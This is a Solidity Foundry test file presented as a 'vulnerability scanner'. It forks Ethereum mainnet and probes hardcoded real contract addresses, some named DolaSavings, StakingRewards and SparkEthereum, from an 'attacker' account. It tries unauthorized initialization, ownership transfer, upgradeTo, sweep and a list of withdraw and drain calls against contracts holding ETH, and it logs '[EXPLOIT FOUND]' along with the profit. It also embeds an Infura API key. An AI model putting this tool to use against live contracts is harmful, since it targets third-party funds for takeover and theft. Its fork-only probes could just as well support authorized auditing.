// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Novel Vulnerability Scanner
 * @notice Systematically probes contracts for unprivileged access control exploits
 * Focus: Access control, privilege escalation, emergent multi-step takeovers
 */

interface IProxy {
    function implementation() external view returns (address);
    function admin() external view returns (address);
    function upgradeTo(address) external;
    function upgradeToAndCall(address, bytes calldata) external;
}

interface IProxyAdmin {
    function getProxyAdmin(address proxy) external view returns (address);
    function getProxyImplementation(address proxy) external view returns (address);
    function upgrade(address proxy, address implementation) external;
    function owner() external view returns (address);
}

interface IOwnable {
    function owner() external view returns (address);
    function transferOwnership(address) external;
    function renounceOwnership() external;
}

interface IAccessControl {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
}

interface IInitializable {
    function initialize() external;
    function initialize(address) external;
    function initialize(address, address) external;
    function initialize(address, address, address) external;
    function initialized() external view returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract NovelVulnScannerTest is Test {
    // EIP-1967 Proxy Storage Slots
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

    // Common role identifiers
    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = makeAddr("attacker");
    }

    /*//////////////////////////////////////////////////////////////
                        PROXY VULNERABILITY CHECKS
    //////////////////////////////////////////////////////////////*/

    function testScanProxiesForUninitializedImpl() public {
        // List of known proxy contracts from contracts.txt
        address[] memory proxies = new address[](10);
        proxies[0] = 0x73Faec34b4a800b3fF7fbb9e8F3bc2F4Eb84737A;
        proxies[1] = 0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329;
        proxies[2] = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0;
        proxies[3] = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83;
        proxies[4] = 0x3300f198988e4C9C63F75dF86De36421f06af8c4;
        proxies[5] = 0xa1E2481a9CD0Cb0447EeB1cbc26F1b3fff3bec20;
        proxies[6] = 0xC4e16E56eA3660110924cC06850120672b7e11eF;
        proxies[7] = 0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f;
        proxies[8] = 0x9F30507C264Cc6EB5bE35b18ff9AD7B4539Aa920;
        proxies[9] = 0x4D5aA29862bc8186E19eE5b699494Aa40fC83206;

        console.log("=== SCANNING PROXIES FOR UNINITIALIZED IMPLEMENTATIONS ===\n");

        for (uint i = 0; i < proxies.length; i++) {
            address proxy = proxies[i];
            if (proxy.code.length == 0) continue;

            _checkProxyVulnerabilities(proxy);
        }
    }

    function _checkProxyVulnerabilities(address proxy) internal {
        console.log("\n--- Checking proxy:", proxy, "---");
        console.log("Proxy balance:", proxy.balance / 1e18, "ETH");

        // Read implementation from EIP-1967 slot
        bytes32 implSlot = vm.load(proxy, IMPLEMENTATION_SLOT);
        address implementation = address(uint160(uint256(implSlot)));

        // Read admin from EIP-1967 slot
        bytes32 adminSlotData = vm.load(proxy, ADMIN_SLOT);
        address admin = address(uint160(uint256(adminSlotData)));

        console.log("Implementation (EIP-1967):", implementation);
        console.log("Admin (EIP-1967):", admin);

        if (implementation != address(0) && implementation.code.length > 0) {
            // Check if implementation is initializable and not initialized
            _checkImplementationInitialization(implementation, proxy);
        }

        // Check if admin is accessible
        if (admin == address(0)) {
            console.log("[!] WARNING: No admin set - potential upgrade vulnerability");
        }
    }

    function _checkImplementationInitialization(address impl, address proxy) internal {
        // Try to check if implementation is initialized directly
        // If we can initialize it, we might be able to become owner/admin

        vm.startPrank(attacker);

        // Try various initialize signatures
        (bool success1,) = impl.call(abi.encodeWithSignature("initialize()"));
        (bool success2,) = impl.call(abi.encodeWithSignature("initialize(address)", attacker));
        (bool success3,) = impl.call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker));

        if (success1 || success2 || success3) {
            console.log("[CRITICAL] Implementation can be initialized directly!");
            console.log("Attacker could potentially take over implementation");

            // Check if attacker gained any role
            try IOwnable(impl).owner() returns (address owner) {
                if (owner == attacker) {
                    console.log("[EXPLOIT] Attacker is now owner of implementation!");
                }
            } catch {}
        }

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        ACCESS CONTROL ENUMERATION
    //////////////////////////////////////////////////////////////*/

    function testEnumerateAccessControl() public {
        // Contracts with AccessControl patterns
        address[] memory targets = new address[](5);
        targets[0] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4; // DolaSavings
        targets[1] = 0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6; // SavingAccount
        targets[2] = 0x10ab606B067C9C461d8893c47C7512472E19e2Ce; // StakingRewards
        targets[3] = 0xCF9326e24EBfFBEF22ce1050007A43A3c0B6DB55; // SparkEthereum
        targets[4] = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918;

        console.log("=== ENUMERATING ACCESS CONTROL ===\n");

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            if (target.code.length == 0) continue;

            _enumerateOwnership(target);
            _enumerateRoles(target);
        }
    }

    function _enumerateOwnership(address target) internal view {
        console.log("\n--- Target:", target, "---");

        // Try Ownable pattern
        try IOwnable(target).owner() returns (address owner) {
            console.log("Owner:", owner);

            // Check if owner is a contract (multisig/timelock)
            if (owner.code.length > 0) {
                console.log("Owner is contract (likely multisig/timelock)");
            } else {
                console.log("[NOTE] Owner is EOA");
            }
        } catch {}

        // Try gov pattern (common in DeFi)
        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("gov()"));
        if (s1 && d1.length >= 32) {
            address gov = abi.decode(d1, (address));
            console.log("Gov:", gov);
        }

        // Try operator pattern
        (bool s2, bytes memory d2) = target.staticcall(abi.encodeWithSignature("operator()"));
        if (s2 && d2.length >= 32) {
            address operator = abi.decode(d2, (address));
            console.log("Operator:", operator);
        }

        // Try admin pattern
        (bool s3, bytes memory d3) = target.staticcall(abi.encodeWithSignature("admin()"));
        if (s3 && d3.length >= 32) {
            address admin = abi.decode(d3, (address));
            console.log("Admin:", admin);
        }
    }

    function _enumerateRoles(address target) internal view {
        // Try AccessControl pattern
        try IAccessControl(target).hasRole(DEFAULT_ADMIN_ROLE, address(0)) {
            console.log("Has AccessControl pattern");

            // Check common roles
            bytes32[] memory roles = new bytes32[](4);
            roles[0] = DEFAULT_ADMIN_ROLE;
            roles[1] = MINTER_ROLE;
            roles[2] = PAUSER_ROLE;
            roles[3] = UPGRADER_ROLE;

            for (uint i = 0; i < roles.length; i++) {
                try IAccessControl(target).getRoleAdmin(roles[i]) returns (bytes32 adminRole) {
                    if (adminRole != bytes32(0) || i == 0) {
                        console.log("Role", i, "admin:", uint256(adminRole));
                    }
                } catch {}
            }
        } catch {}
    }

    /*//////////////////////////////////////////////////////////////
                        PRIVILEGED FUNCTION PROBING
    //////////////////////////////////////////////////////////////*/

    function testProbePrivilegedFunctions() public {
        console.log("=== PROBING PRIVILEGED FUNCTIONS ===\n");

        // Try to call privileged functions as unprivileged attacker
        address[] memory targets = new address[](5);
        targets[0] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
        targets[1] = 0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6;
        targets[2] = 0x73Faec34b4a800b3fF7fbb9e8F3bc2F4Eb84737A;
        targets[3] = 0xCF9326e24EBfFBEF22ce1050007A43A3c0B6DB55;
        targets[4] = 0x10ab606B067C9C461d8893c47C7512472E19e2Ce;

        vm.startPrank(attacker);

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            if (target.code.length == 0) continue;

            console.log("\n--- Probing:", target, "---");

            // Try ownership transfer
            (bool s1,) = target.call(abi.encodeWithSignature("transferOwnership(address)", attacker));
            if (s1) console.log("[CRITICAL] transferOwnership succeeded!");

            // Try setting operator
            (bool s2,) = target.call(abi.encodeWithSignature("setOperator(address)", attacker));
            if (s2) console.log("[CRITICAL] setOperator succeeded!");

            // Try setting gov
            (bool s3,) = target.call(abi.encodeWithSignature("setGov(address)", attacker));
            if (s3) console.log("[CRITICAL] setGov succeeded!");

            // Try pause
            (bool s4,) = target.call(abi.encodeWithSignature("pause()"));
            if (s4) console.log("[HIGH] pause() succeeded!");

            // Try unpause
            (bool s5,) = target.call(abi.encodeWithSignature("unpause()"));
            if (s5) console.log("[HIGH] unpause() succeeded!");

            // Try sweep/withdraw
            (bool s6,) = target.call(abi.encodeWithSignature("sweep(address,uint256,address)", address(0), 0, attacker));
            if (s6) console.log("[CRITICAL] sweep succeeded!");

            // Try emergency withdraw
            (bool s7,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
            if (s7) console.log("[CRITICAL] emergencyWithdraw succeeded!");

            // Try upgrade
            (bool s8,) = target.call(abi.encodeWithSignature("upgradeTo(address)", attacker));
            if (s8) console.log("[CRITICAL] upgradeTo succeeded!");
        }

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        HIGH-VALUE CONTRACT SCANNING
    //////////////////////////////////////////////////////////////*/

    function testScanHighValueContracts() public {
        console.log("=== SCANNING HIGH-VALUE CONTRACTS ===\n");

        // Contracts from contracts.txt with significant balance
        address[] memory highValue = new address[](15);
        highValue[0] = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d;
        highValue[1] = 0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329;
        highValue[2] = 0x73Faec34b4a800b3fF7fbb9e8F3bc2F4Eb84737A;
        highValue[3] = 0xa1E2481a9CD0Cb0447EeB1cbc26F1b3fff3bec20;
        highValue[4] = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918;
        highValue[5] = 0x4F4495243837681061C4743b74B3eEdf548D56A5;
        highValue[6] = 0x446B86A33E2a438f569B15855189e3dA28d027ba;
        highValue[7] = 0xF6080D9fbEEbcd44D89aFfBFd42F098cbFf92816;
        highValue[8] = 0x3300f198988e4C9C63F75dF86De36421f06af8c4;
        highValue[9] = 0x9201da0D97CaAAff53f01B2fB56767C7072dE340;
        highValue[10] = 0xC4e16E56eA3660110924cC06850120672b7e11eF;
        highValue[11] = 0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f;
        highValue[12] = 0x7Cd01D5CaD4BA0CaEbA02583a5C61d35B23E08eB;
        highValue[13] = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367;
        highValue[14] = 0x9F30507C264Cc6EB5bE35b18ff9AD7B4539Aa920;

        for (uint i = 0; i < highValue.length; i++) {
            address target = highValue[i];

            uint256 ethBal = target.balance;
            if (ethBal < 1 ether) continue;

            console.log("\n--- High Value Target:", target, "---");
            console.log("ETH Balance:", ethBal / 1e18, "ETH");
            console.log("Code size:", target.code.length);

            // Check for common withdraw patterns
            _probeWithdrawPatterns(target);
        }
    }

    function _probeWithdrawPatterns(address target) internal {
        vm.startPrank(attacker);
        uint256 balBefore = attacker.balance;

        // Try various withdrawal functions
        bytes4[] memory withdrawSigs = new bytes4[](10);
        withdrawSigs[0] = bytes4(keccak256("withdraw()"));
        withdrawSigs[1] = bytes4(keccak256("withdraw(uint256)"));
        withdrawSigs[2] = bytes4(keccak256("withdrawAll()"));
        withdrawSigs[3] = bytes4(keccak256("withdrawETH()"));
        withdrawSigs[4] = bytes4(keccak256("claim()"));
        withdrawSigs[5] = bytes4(keccak256("claimAll()"));
        withdrawSigs[6] = bytes4(keccak256("exit()"));
        withdrawSigs[7] = bytes4(keccak256("emergencyWithdraw()"));
        withdrawSigs[8] = bytes4(keccak256("rescue()"));
        withdrawSigs[9] = bytes4(keccak256("drain()"));

        for (uint i = 0; i < withdrawSigs.length; i++) {
            (bool success,) = target.call(abi.encodeWithSelector(withdrawSigs[i]));
            if (success && attacker.balance > balBefore) {
                console.log("[EXPLOIT FOUND] Withdraw succeeded!");
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
            }
        }

        vm.stopPrank();
    }

    receive() external payable {}
}
